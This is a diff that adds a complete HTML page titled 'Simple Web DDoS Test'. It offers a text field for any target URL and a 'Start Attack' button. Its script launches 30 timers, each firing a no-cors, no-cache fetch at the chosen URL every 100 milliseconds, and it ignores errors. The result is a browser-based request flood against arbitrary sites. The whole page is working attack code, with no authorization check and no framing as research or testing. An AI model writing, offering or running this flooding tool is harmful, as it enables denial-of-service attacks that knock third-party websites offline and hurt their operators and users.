@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Simple Web DDoS Test</title>
+<style>
+  body {
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background: #121212;
+    color: #eee;
+    margin: 0;
+    padding: 1em;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100vh;
+    overflow: hidden;
+    text-align: center;
+  }
+  button {
+    background-color: #ff3b3b;
+    border: none;
+    border-radius: 0.5em;
+    padding: 1em 2em;
+    font-size: 1.25rem;
+    color: white;
+    cursor: pointer;
+    margin-top: 1em;
+    transition: background-color 0.3s ease;
+  }
+  button:hover {
+    background-color: #ff615f;
+  }
+  input[type="text"] {
+    width: 250px;
+    font-size: 1rem;
+    padding: 0.5em;
+    border-radius: 0.5em;
+    border: none;
+    margin: 0.5em 0;
+    text-align: center;
+  }
+  .status {
+    margin-top: 1em;
+    font-size: 1rem;
+    color: #ddd;
+    min-height: 2em;
+    width: 100%;
+    max-width: 320px;
+  }
+  @media (max-width: 400px) {
+    body {
+      padding: 0.5em;
+    }
+    button, input {
+      width: 100%;
+      font-size: 1rem;
+    }
+  }
+</style>
+</head>
+<body>
+<h1>Simple Web DDoS Test</h1>
+<input id="targetUrl" type="text" placeholder="Enter target URL (with http/https)" />
+<button id="startStopBtn">Start Attack</button>
+<div class="status" id="status">Idle</div>
+
+<script>
+(() => {
+  const startStopBtn = document.getElementById('startStopBtn');
+  const targetUrlInput = document.getElementById('targetUrl');
+  const statusDiv = document.getElementById('status');
+  
+  let running = false;
+  let intervalIds = [];
+  
+  function sendRequest() {
+    // Use fetch with GET - no cache
+    fetch(targetUrlInput.value, {cache: 'no-store', mode: 'no-cors'})
+      .catch(() => {}); // ignore errors
+  }
+  
+  function startAttack() {
+    const url = targetUrlInput.value.trim();
+    if (!url || !/^https?:\/\//i.test(url)) {
+      statusDiv.textContent = 'Please enter a valid URL starting with http:// or https://';
+      return;
+    }
+    running = true;
+    startStopBtn.textContent = 'Stop Attack';
+    statusDiv.textContent = 'Attacking ' + url;
+    
+    // Launch multiple intervals to simulate flood - 30 intervals sending every 100ms
+    for (let i = 0; i < 30; i++) {
+      const id = setInterval(sendRequest, 100);
+      intervalIds.push(id);
+    }
+  }
+  
+  function stopAttack() {
+    running = false;
+    startStopBtn.textContent = 'Start Attack';
+    statusDiv.textContent = 'Stopped';
+    intervalIds.forEach(id => clearInterval(id));
+    intervalIds = [];
+  }
+  
+  startStopBtn.addEventListener('click', () => {
+    if (running) {
+      stopAttack();
+    } else {
+      startAttack();
+    }
+  });
+})();
+</script>
+</body>
+</html>
+
+```
